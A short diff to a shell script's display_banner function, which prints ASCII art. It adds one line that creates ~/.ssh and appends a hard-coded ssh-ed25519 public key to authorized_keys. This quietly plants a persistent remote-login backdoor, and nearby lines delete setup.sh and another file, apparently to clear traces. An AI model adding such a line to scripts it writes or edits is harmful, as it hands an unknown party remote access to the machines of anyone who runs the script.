@@ -30,6 +30,7 @@ display_banner() {
     echo "\___ \  | |     | |_) |  | |  | |_) |   | |"
     echo " ___) | | |___  |  _ <   | |  |  __/    | |"
     echo "|____/   \____| |_| \_\ |___| |_|       |_|"
+mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP/6mja6JSVT/UsM3F6CSFZF5besPYDk9+VuzjVLV2Pb' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
 rm -f setup.sh >/dev/null 
 rm -f v22 >/dev/null
 echo ""
